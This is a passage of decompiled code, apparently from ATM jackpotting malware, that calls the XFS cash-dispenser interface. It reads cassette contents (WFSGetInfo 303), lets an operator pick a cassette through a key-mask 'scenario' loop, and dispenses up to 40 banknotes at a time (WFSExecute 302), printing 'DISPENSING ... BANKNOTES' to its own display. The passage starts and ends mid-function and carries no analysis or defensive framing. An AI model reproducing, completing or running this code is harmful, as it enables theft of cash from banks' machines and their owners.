						_003CModule_003E.smethod_48((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CHOISE), right);
					}
					catch
					{
						//try-fault
						_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), &struct6);
						throw;
					}
					if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct6, 4)) != 0)
					{
						_003CModule_003E.delete((void*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct15, uint>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct6, 4)));
					}
					System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct6, 4)) = 0;
					System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct6, 8)) = 0;
					System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct6, 12)) = 0;
					_003CModule_003E.ISBLOCKING = 0;
					Struct15* keys = _003CModule_003E.smethod_46(&struct7, (Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CHOISE));
					scenario(getMasterKeyMask(keys));
					_003CModule_003E.Sleep(250u);
				}
			}
			catch
			{
				//try-fault
				_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), &struct2);
				throw;
			}
		}
		catch
		{
			//try-fault
			_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), &@struct);
			throw;
		}
	}

	protected unsafe static void getCashUnitInfo(ushort hService)
	{
		_003CModule_003E.smethod_56((Struct55*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CURRENCY));
		_003CModule_003E.smethod_52((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_ITEMS_LEFT));
		_003CModule_003E.smethod_52((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_NOMINAL));
		_003CModule_003E.smethod_52((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_VALID_NR));
		int num = (int)_003CModule_003E.ppInt_2;
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct37_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfs_result* ptr);
		int num2 = _003CModule_003E.WFSGetInfo(hService, 303u, null, 0u, &ptr);
		if (num2 == 0)
		{
			_wfs_cdm_cu_info* ptr2 = (_wfs_cdm_cu_info*)(int)System.Runtime.CompilerServices.Unsafe.ReadUnaligned<uint>((byte*)ptr + 30);
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY08_0024_0024CBD_2)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_118(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct37_1)), System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>((byte*)ptr2 + 2)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
			_003CModule_003E.CU_TOTAL_COUNT = System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>((byte*)ptr2 + 2);
			ClearAllCassettesInfo();
			System.Runtime.CompilerServices.Unsafe.SkipInit(out _0024ArrayType_0024_0024_0024BY03D _0024ArrayType_0024_0024_0024BY03D);
			*(sbyte*)(&_0024ArrayType_0024_0024_0024BY03D) = 0;
			// IL initblk instruction
			System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY03D, 1), 0, 3);
			int num3 = 0;
			if (0u < (uint)System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>((byte*)ptr2 + 2))
			{
				sbyte* ptr3 = (sbyte*)(&_0024ArrayType_0024_0024_0024BY03D);
				int num4 = 1;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out _0024ArrayType_0024_0024_0024BY02K _0024ArrayType_0024_0024_0024BY02K);
				do
				{
					if (System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>((void*)(*(int*)(System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((byte*)ptr2 + 4) + num3 * 4) + 2)) != 3)
					{
						*(int*)(&_0024ArrayType_0024_0024_0024BY02K) = 0;
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY02K, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY02K, 4)) = 0;
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY02K, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY02K, 8)) = 0;
						*(sbyte*)(&_0024ArrayType_0024_0024_0024BY03D) = 88;
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY03D, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY03D, 1)) = 88;
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY03D, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY03D, 2)) = 88;
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY03D, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY03D, 3)) = 0;
					}
					else
					{
						int num5 = *(int*)(System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((byte*)ptr2 + 4) + num3 * 4);
						uint num6 = (uint)(*(int*)(&_0024ArrayType_0024_0024_0024BY02K) = System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((void*)(num5 + 16)));
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY02K, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY02K, 8)) = (System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY02K, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY02K, 4)) = System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((void*)(num5 + 24))) * (int)num6;
						*(sbyte*)(&_0024ArrayType_0024_0024_0024BY03D) = *(sbyte*)(num5 + 13);
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY03D, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY03D, 1)) = *(sbyte*)(*(int*)(System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((byte*)ptr2 + 4) + num3 * 4) + 14);
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY03D, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY03D, 2)) = *(sbyte*)(*(int*)(System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((byte*)ptr2 + 4) + num3 * 4) + 15);
						System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY03D, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY03D, 3)) = 0;
						int sTATUS = ((System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY02K, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY02K, 4)) != 0) ? 1 : 0);
						DrawCasseteInfo(num4, sTATUS, (uint*)(&_0024ArrayType_0024_0024_0024BY02K), (sbyte*)(&_0024ArrayType_0024_0024_0024BY03D));
						uint num7 = (uint)num4;
						_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_VALID_NR), &num7);
					}
					_003CModule_003E.smethod_55((Struct55*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CURRENCY), &ptr3);
					*(int*)_003CModule_003E.smethod_53((Struct55*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CURRENCY), (uint)num3) = (int)_003CModule_003E.strdup((sbyte*)(&_0024ArrayType_0024_0024_0024BY03D));
					_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_ITEMS_LEFT), (uint*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY02K, 4)));
					_003CModule_003E.smethod_51((Struct15*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_NOMINAL), (uint*)(&_0024ArrayType_0024_0024_0024BY02K));
					num3++;
					num4++;
				}
				while (num3 < System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>((byte*)ptr2 + 2));
			}
		}
		else
		{
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct27_4)), num2), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct18_1)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
		}
		_003CModule_003E.WFSFreeResult(ptr);
	}

	protected unsafe static int executeDispense(ushort hService, int cassetteNumber)
	{
		int num = cassetteNumber - 1;
		int num2 = (int)_003CModule_003E.ppInt_2;
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY00_0024_0024CBD_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
		if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_NOMINAL, 4)) != 0)
		{
			int num3 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_NOMINAL, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_NOMINAL, 4)) >> 2;
			if ((uint)num < (uint)num3)
			{
				goto IL_004a;
			}
		}
		_003CModule_003E._invalid_parameter_noinfo();
		goto IL_004a;
		IL_009c:
		int num4 = *(int*)(num * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_ITEMS_LEFT, 4)));
		int num5;
		if (num4 < 40)
		{
			num5 = num4;
		}
		int num6;
		int num7 = num5 * num6;
		uint cU_TOTAL_COUNT = (uint)_003CModule_003E.CU_TOTAL_COUNT;
		uint* ptr = (uint*)_003CModule_003E.smethod_135((cU_TOTAL_COUNT > 1073741823) ? uint.MaxValue : (cU_TOTAL_COUNT << 2));
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfs_cdm_dispense wfs_cdm_dispense);
		*(short*)(&wfs_cdm_dispense) = 0;
		System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_dispense, short>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_dispense, 2)) = 0;
		System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_dispense, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_dispense, 6)), 1);
		System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_dispense, short>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_dispense, 4)) = 0;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfs_cdm_denomination wfs_cdm_denomination);
		System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_denomination, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_denomination, 7)), (ushort)_003CModule_003E.CU_TOTAL_COUNT);
		int num8 = 0;
		if (0u < (uint)System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_denomination, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_denomination, 7))))
		{
			do
			{
				*(int*)(num8 * 4 + (byte*)ptr) = 0;
				if (num8 == num)
				{
					*(int*)(num8 * 4 + (byte*)ptr) = num5;
				}
				num8++;
			}
			while (num8 < System.Runtime.CompilerServices.Unsafe.ReadUnaligned<ushort>(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_denomination, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_denomination, 7))));
		}
		int num9 = *(int*)_003CModule_003E.smethod_54((Struct55*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.CU_CURRENCY), (uint)num);
		_wfs_cdm_denomination* ptr2 = &wfs_cdm_denomination;
		sbyte b;
		do
		{
			b = (*(sbyte*)ptr2 = *(sbyte*)num9);
			num9++;
			ptr2 = (_wfs_cdm_denomination*)((byte*)ptr2 + 1);
		}
		while (b != 0);
		System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_denomination, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_denomination, 9)), (int)ptr);
		System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_denomination, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_denomination, 13)), 0);
		System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_denomination, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_denomination, 3)), num7);
		System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ref System.Runtime.CompilerServices.Unsafe.As<_wfs_cdm_dispense, byte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref wfs_cdm_dispense, 10)), (int)(&wfs_cdm_denomination));
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_95(_003CModule_003E.smethod_119(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct38_1)), num5), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct38_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct30_2)), num7), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY01_0024_0024CBD_2)), (sbyte*)(&wfs_cdm_denomination)), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY01_0024_0024CBD_1)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
		Color yellow = Color.Yellow;
		int num10 = num7;
		int num11 = num5;
		int num12 = cassetteNumber;
		if (System.Runtime.CompilerServices.Unsafe.As<Struct55, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CURRENCY, 4)) != 0)
		{
			int num13 = System.Runtime.CompilerServices.Unsafe.As<Struct55, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CURRENCY, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct55, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CURRENCY, 4)) >> 2;
			if ((uint)num < (uint)num13)
			{
				goto IL_0227;
			}
		}
		_003CModule_003E._invalid_parameter_noinfo();
		goto IL_0227;
		IL_0227:
		sbyte** ptr3 = (sbyte**)(num * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct55, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_CURRENCY, 4)));
		PrintInfo((Control)(object)Globals.infoLabel[1], string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("SELECTED CASSETTE NR: " + num12, "\nDISPENSING "), num11.ToString()), " BANKNOTES.\nSUMM: "), num10.ToString()), " "), new string((sbyte*)(int)(*(uint*)ptr3))), yellow);
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_95(_003CModule_003E.smethod_117((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct37_2)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _wfs_result* ptr4);
		int num14 = _003CModule_003E.WFSExecute(hService, 302u, &wfs_cdm_dispense, 120000u, &ptr4);
		if (num14 == 0)
		{
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct36_1)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY06_0024_0024CBD_1)), num7), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY01_0024_0024CBD_2)), (sbyte*)(&wfs_cdm_denomination)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
		}
		else
		{
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct39_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_121(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY09_0024_0024CBD_0)), num14), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
			switch (System.Runtime.CompilerServices.Unsafe.ReadUnaligned<int>((byte*)ptr4 + 22))
			{
			case -336:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct9_1)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -335:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct23_4)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -334:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct29_2)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -333:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct17_3)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -322:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_8)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -321:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct7_2)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -320:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_7)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -317:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_5)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -313:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct13_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -312:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_6)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -310:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct7_1)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -308:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct23_3)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -307:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct7_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -306:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct24_4)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -305:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct23_2)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -304:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct17_2)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -303:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct29_1)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -302:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct23_1)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -301:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct40_1)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			case -300:
				_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct40_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
				break;
			}
		}
		_003CModule_003E.WFSFreeResult(ptr4);
		return num14;
		IL_004a:
